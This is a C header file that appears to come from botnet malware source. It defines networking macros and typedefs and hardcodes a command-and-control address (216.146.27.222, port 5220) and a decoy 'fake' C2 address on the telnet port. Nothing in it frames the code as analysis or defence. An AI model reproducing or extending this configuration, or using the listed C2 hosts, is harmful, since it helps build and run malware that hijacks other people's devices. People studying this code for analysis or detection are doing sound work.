#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1

#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))

#define LOCALHOST (INET_ADDR(127,0,0,1))

#define CNC_PORT 5220
#define CNC_IP   INET_ADDR(216,146,27,222)

#define FAKE_CNC_ADDR  INET_ADDR(176,123,26,89)
#define FAKE_CNC_PORT  23

typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

extern ipv4_t LOCAL_ADDR;
